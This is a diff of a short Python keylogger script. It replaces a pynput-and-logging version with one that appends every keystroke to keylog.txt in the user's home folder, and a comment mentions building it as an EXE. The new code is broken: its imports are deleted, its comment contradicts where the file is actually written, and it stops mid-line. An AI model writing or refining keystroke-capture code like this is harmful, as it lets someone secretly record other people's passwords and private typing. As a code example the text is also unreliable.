@@ -1,17 +1,12 @@
-#library
-from pynput.keyboard import Key, Listener
-#vanilla
-import logging
-
-#make a log file
-log_dir = ""
-
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
+# Save keystrokes to the same directory as the EXE/script
+log_file = os.path.join(os.path.expanduser("~"), "keylog.txt")
 
 def on_press(key):
-    logging.info(str(key))
-    #if key == key.asc:
-     #return false
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    try:
+        with open(log_file, "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
 
+listener = keyboard.Listener(on_press=on_pr
